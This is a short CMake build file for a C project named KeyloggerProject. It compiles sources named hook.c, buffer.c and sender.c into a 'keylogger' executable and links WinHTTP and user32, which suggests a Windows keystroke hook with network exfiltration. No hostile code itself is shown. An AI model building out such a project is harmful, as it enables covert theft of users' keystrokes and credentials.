cmake_minimum_required(VERSION 3.15)
project(KeyloggerProject C)

set(CMAKE_C_STANDARD 11)

set(SOURCES
    src/main.c
    src/buffer.c
    src/hook.c
    src/sender.c
    src/utils.c
)

add_executable(keylogger ${SOURCES})

target_link_libraries(keylogger
    winhttp
    user32
    kernel32
)